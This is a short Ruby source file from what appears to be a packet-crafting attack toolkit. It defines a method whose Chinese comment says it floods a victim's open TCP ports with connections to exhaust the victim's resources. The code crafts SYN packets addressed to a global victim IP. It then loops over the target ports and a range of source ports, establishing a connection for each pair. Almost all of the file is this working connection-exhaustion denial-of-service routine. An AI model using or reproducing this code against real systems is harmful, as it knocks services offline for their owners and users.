require_relative '../../protocol/tcp_pac.rb'
require_relative '../../../config_con_var.rb'

class TCPP
	# 对受害者开放的tcp端口发起大量连接占用其资源.ports是目标端口数组
	def self.use_up_tcp_resrc(pcap, ports)
		pac = TCPP.syn_pac{|pac|
			pac.ipv4h.dst_addr = $victim_ip
		}

		ports.each do |port|
			pac.tcph.dst_port = port
			$port_range.each do |i|
				pac.tcph.src_port = i
				pac.set_check_sum_tcp
				TCPP.establish_conn(pcap, pac)
			end
		end
	end
end

